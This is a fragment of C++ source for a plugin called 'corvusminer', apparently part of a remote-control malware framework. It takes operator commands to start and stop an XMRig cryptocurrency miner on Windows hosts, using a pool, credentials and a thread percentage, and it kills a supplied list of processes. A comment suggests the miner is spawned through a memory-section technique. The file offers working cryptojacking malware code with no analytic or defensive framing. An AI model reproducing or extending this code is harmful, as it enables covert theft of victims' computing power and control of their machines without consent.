        std::vector<std::string> kill_processes = json_extract_array(pl.c_str(), pl.size(), "kill_processes");
        std::string xmrig_path = json_extract_string(pl.c_str(), pl.size(), "xmrig_path");
        
        fprintf(stderr, "[corvusminer] mining_start: pool=%s user=%s hint=%d%% processes_to_kill=%zu\n",
                pool.c_str(), username.c_str(), threads_hint, kill_processes.size());
        
        if (threads_hint <= 0) threads_hint = 100;
        
        /* Queue mining start on monitor thread (avoid calling Windows APIs from Go plugin callback) */
        {
            std::lock_guard<std::mutex> lk(g_mu);
            g_should_be_mining = true;
            g_mining_start_pending = true;
            g_blocked_processes = kill_processes;
            g_pool = pool;
            g_username = username;
            g_password = password;
            g_threads_hint = threads_hint;
            g_xmrig_path = xmrig_path;
        }
        
        fprintf(stderr, "[corvusminer] queued mining_start for monitor thread\n");
        /* Wake the monitor thread immediately so it doesn't wait up to 5 s */
        if (g_wake_event) SetEvent(g_wake_event);
        return 0;
    }

    if (ev == "mining_stop") {
        fprintf(stderr, "[corvusminer] mining_stop\n");
        {
            std::lock_guard<std::mutex> lk(g_mu);
            g_should_be_mining = false;
            g_mining_start_pending = false;
        }
        stop_xmrig();
        return 0;
    }

    if (ev == "stats") {
        std::lock_guard<std::mutex> lk(g_mu);
        std::string json = "{";
        bool first = true;
        for (auto &kv : g_event_counts) {
            if (!first) json += ",";
            json += "\"" + kv.first + "\":" + std::to_string(kv.second);
            first = false;
        }
        json += "}";
        send_event("stats_reply", json.c_str());
        return 0;
    }

    fprintf(stderr, "[corvusminer] unhandled event: %s\n", ev.c_str());
    return 0;
}

EXPORT void PluginOnUnload() {
    fprintf(stderr, "[corvusminer] unloading\n");
    
    /* Stop monitor thread */
    g_monitor_running = false;
    if (g_wake_event) SetEvent(g_wake_event);  /* unblock WaitForSingleObject immediately */
    if (g_monitor_thread != nullptr) {
        /* Wait long enough for an in-progress spawn (6 MB write + section create) to finish */
        WaitForSingleObject(g_monitor_thread, 30000);
        CloseHandle(g_monitor_thread);
        g_monitor_thread = nullptr;
    }
    if (g_wake_event) {
        CloseHandle(g_wake_event);
        g_wake_event = nullptr;
    }
    
    /* Clear mining config */
    {
        std::lock_guard<std::mutex> lk(g_mu);
        g_should_be_mining = false;
        g_blocked_processes.clear();
        g_pool.clear();
        g_username.clear();
        g_password.clear();
        g_xmrig_path.clear();
    }
    
    stop_xmrig();
    g_callback = nullptr;
#ifndef _WIN32
    g_callback_ctx = 0;
#endif
    std::lock_guard<std::mutex> lk(g_mu);
    g_client_id.clear();
    g_event_counts.clear();
}
